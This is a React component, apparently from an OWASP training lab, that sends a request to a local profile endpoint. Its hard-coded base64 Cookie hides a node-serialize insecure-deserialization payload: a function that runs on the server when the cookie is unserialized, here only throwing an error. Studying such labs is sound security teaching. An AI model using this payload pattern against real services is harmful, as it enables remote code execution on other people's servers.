import React, { useState } from 'react'
import 'owasp-shared/style.css'
import { loggedInToken as BEARER_TOKEN } from 'owasp-shared/test-utils'

//urls
const PROFILE_URL = 'http://localhost:3000/profile'

const headers = {
  Authorization: `Bearer ${BEARER_TOKEN}`,
  Accept: '*/*',
  'Accept-Encoding': 'gzip, deflate, br',
  Connection: 'keep-alive',
  Cookie:
    'profile=eyJpZCI6MSwidXNlcm5hbWUiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkge1xuICAgIHRocm93IG5ldyBFcnJvcignc2VydmVyIGVycm9yJylcbiAgfSgpIn0='
}

export default function App() {
  const [url, setURL] = useState(PROFILE_URL)
  const [status, setStatus] = useState(null)
  const [data, setData] = useState()
  const handleURLChange = event => {
    setURL(event.target.value)
  }
  const handleSubmit = async () => {
    try {
      const response = await fetch(url, { headers })

      const data = await response.json()

      response.ok
        ? setStatus(`success, ${response.status}`)
        : setStatus(`failed, ${response.status}`)

      setData(data)
    } catch (error) {
      console.error(error)
    }
  }

  return (
    <div className="App">
      <h2>Get profile from cookie</h2>
      <div className="main-section">
        <div className="request-details">
          <h3>url</h3>
          <input
            className="url-input"
            value={PROFILE_URL}
            onChange={handleURLChange}
          ></input>
          <button className="url-input-button" onClick={handleSubmit}>
            send
          </button>
        </div>

        <div className="response-section">
          <h2 className="success">Response: {status}</h2>
          <code>{JSON.stringify(data)}</code>
        </div>
      </div>
    </div>
  )
}
